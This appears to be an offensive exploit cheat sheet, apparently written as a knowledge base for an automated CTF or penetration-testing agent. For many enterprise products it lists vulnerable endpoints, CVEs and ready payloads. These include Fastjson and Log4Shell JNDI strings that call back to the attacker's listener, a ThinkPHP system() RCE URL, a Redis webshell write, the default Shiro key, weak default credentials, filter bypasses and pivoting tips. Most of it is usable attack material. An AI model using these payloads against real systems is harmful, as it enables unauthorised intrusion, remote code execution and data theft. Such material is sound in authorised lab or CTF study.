# Product PoC inventory (curated endpoint / CVE quick-reference)

Search THIS before hand-crafting payloads — a known PoC is faster than
derivation. For each product: fingerprint the version (Server header,
/actuator/info, /login page footer, META-INF, README), then probe the leads.
nuclei templates live at `/opt/nuclei-templates/http/cves/` and `.../vulnerabilities/`;
run `nuclei -u T -t /opt/nuclei-templates/http -severity critical,high -c 4`
to sweep, then escalate each hit by hand.

## 泛微 Weaver / e-cology / e-office (b-02 foothold — highest priority)
- **DB config leak**: `/mobile/DBconfigReader.jsp`, `/mysql_config.ini`,
  `/weaver/.../getE9DevelopAllNameValue2`, `SignatureDownLoad` → decrypts to DB
  creds. Read `weaver.properties` / `ecology.properties`.
- **BeanShell RCE**: `/weaver/bsh.servlet.BshServlet` → POST BeanShell code.
- **SQLServlet / DB injection**: `/weaver/.../SqlInjection` , WorkflowService.
- **SSRF**: `WorkflowServiceXmlRpc`, `/mobile/.../api` URL params.
- **Auth bypass**: `VerifyQuickLogin.jsp`, `/services/.%2e/` path confusion.
- **Upload RCE**: `/weaver/.../UploadFile`, `.jsp` via Office anywhere.
- Note: the OA often is NOT on the entrance host — read news/articles for the
  migrated internal address, then reach it via pivot (chisel/SSRF).

## Apache OFBiz
- CVE-2024-45195 / CVE-2024-32113: viewseyehd / ProgramExport RCE via
  `/webtools/control/ProgramExport;`. Auth bypass `/%2e/`.

## Confluence
- CVE-2023-22515 (`/server-info?resource=...`), CVE-2023-22518 (setup-restore
  unauth), CVE-2022-26134 (OGNL RCE in URL path `/${Runtime.getRuntime().exec(...)}`).

## Atlassian Jira / Bamboo
- CVE-2019-11581 (contactresolver SSTI), CVE-2022-26133 (sharedmail IMC RCE).

## Apache Shiro
- RememberMe deserialize: `rememberMe` cookie + default key (`AES CBC`,
  `kPH+bIxk5D2deZiIxcaaaA==`). Use `shiro_attack`/ysoserial; keys list at
  `/opt/seclists/Passwords/shiro.keys`. CVE-2016-4437.

## Weblogic
- `/console/console.portal?_nfpb=true&_pageLabel=...` (CVE-2020-14882 auth bypass
  → RCE), `/_async/AsyncResponseService` (CVE-2019-2725), IIOP/T3 deserialization
  (CVE-2018-2628). Weak creds weblogic/welcome1.

## Spring (Boot/Cloud/Function)
- Spring4Shell CVE-2022-22965 (Tomcat AccessLogValve), Spring Cloud Function
  CVE-2022-22963 (`spring.cloud.function.routing-expression`), SpEL injection,
  `/actuator/env` + `/actuator/refresh` (gadget: eureka.client.serviceUrl).

## Fastjson
- autotype RCE: `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOU/Exploit","autoCommit":true}`.
  Dnslog to detect; JNDI payload to YOUR listener. Versions <1.2.68 mostly vuln.

## Log4j (Log4Shell)
- `${jndi:ldap://YOU/x}` in ANY logged field (UA, form, header). OOB to your
  listener first, then RCE. Bypass filters: `${lower:j}ndi`, `${::-j}`.

## ThinkPHP
- 5.x RCE: `/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`.
  5.0.23/5.1.30 route-based RCE.

## PHP / Laravel / Symfony
- Laravel debug mode `Ignition` (CVE-2021-3129, `_ignition` phar deserialization),
  Symfony profiler `/_profiler`, `phpunit` eval (`/vendor/phpunit/...`).

## Redis / memcached / Elasticsearch / MongoDB (unauth)
- Redis unauth → `CONFIG SET dir /var/www/html` + `SET x "<?php system(...);?>"`
  + `SAVE` (webshell), or cron/ssh-key write. SSRF→dict/gopher to reach.
- memcached: `stats`, dump kv; ES: `/_cat/indices`, `/_search?q=*`.

## Jenkins / GitLab / Grafana / phpMyAdmin
- Jenkins unauth `/script` console (`def cmd='id'; println cmd.execute().text`),
  CVE-2024-23897 (arbitrary file read via CLI args). GitLab CVE-2021-22205
  (exiftool RCE on upload). Grafana SSRF/`/public/plugins/` path traversal.

## Adobe ColdFusion
- CVE-2023-26360 (`/cf_scripts/scripts/ajax/...` LCE), CVE-2023-29300 deserialization.

## Tomcat
- Manager weak creds (tomcat/tomcat) → WAR deploy → JSP webshell. AJP ghost
  (CVE-2020-1938) file read/include. PUT method (CVE-2017-12615).

---
When a hit lands: read the matched nuclei template YAML (it has the EXACT path,
method, and often a PoC body), adapt any `{{interactsh}}` to YOUR listener, then
escalate. Record the working payload to notes(fact) — cross-challenge KB will
reuse it on siblings.
